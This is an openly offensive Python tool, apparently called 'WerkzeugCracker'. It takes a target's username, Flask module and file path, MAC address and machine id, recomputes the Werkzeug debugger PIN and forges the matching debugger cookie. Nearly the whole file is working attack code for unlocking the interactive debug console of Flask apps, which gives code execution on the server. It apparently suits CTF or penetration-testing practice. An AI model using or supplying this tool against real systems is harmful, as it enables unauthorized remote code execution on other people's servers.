from colorama import Fore, init
import hashlib
from itertools import chain
import time
init()


def hash_pin(pin: str) -> str:
    pin = pin[0]
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


def generate_cookie(pin: str):
    cookie = ''
    cookie += str(int(time.time()))
    cookie += '|'
    cookie += hash_pin([pin])
    return cookie


def calc_pin(name: str, modname: str, app_name: str, file_path: str, mac_addres: str, machine_id: str) -> str:
    probably_public_bits: list = [
        name,
        modname,
        app_name,
        file_path
    ]

    private_bits: list = [
            str(int(mac_addres.replace(':',''),16)), 
            machine_id
    ]

    num = None
    rv = None

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = f"__wzd{h.hexdigest()[:20]}"
    
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]
    
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return f"\n\nPIN: {rv}\nCookie: {cookie_name}={generate_cookie(rv)}"    




def get_attributes() -> str:
    name: str = input(f"{Fore.CYAN}Enter UserName: {Fore.RED}") # marcus
    modname: str = input(f"{Fore.CYAN}Enter ModName: {Fore.RED}") # flask.app
    app_name: str = input(f"{Fore.CYAN}Enter App Name: {Fore.RED}") # Flask
    file_path: str = input(f"{Fore.CYAN}Enter Path To Flask File: {Fore.RED}") # /usr/lib/python3/dist-packages/flask/app.py 
    mac_addres: str = input(f"{Fore.CYAN}Enter MAC Addres: {Fore.RED}")
    machine_id: str = input(f"{Fore.CYAN}Enter machine_id: {Fore.RED}")
    return calc_pin(name,modname,app_name,file_path,mac_addres,machine_id)

def main():
    name = "Marcus"
    github = "https://github.com/MarcusProgram/"
    print("""
        
░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗██████╗░
░██║░░██╗░░██║██╔════╝██╔══██╗██║░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗
░╚██╗████╗██╔╝█████╗░░██████╔╝█████═╝░██║░░╚═╝██████╔╝███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝
░░████╔═████║░██╔══╝░░██╔══██╗██╔═██╗░██║░░██╗██╔══██╗██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░╚██╔╝░╚██╔╝░███████╗██║░░██║██║░╚██╗╚█████╔╝██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
          """)    
    print(f"\t\t\t\t\t{Fore.RED}(Creator {name})\n\t\t\t(Github: {github}){Fore.RESET}\n\n\n\n")
    return get_attributes()

if __name__ == "__main__":
    print(main())
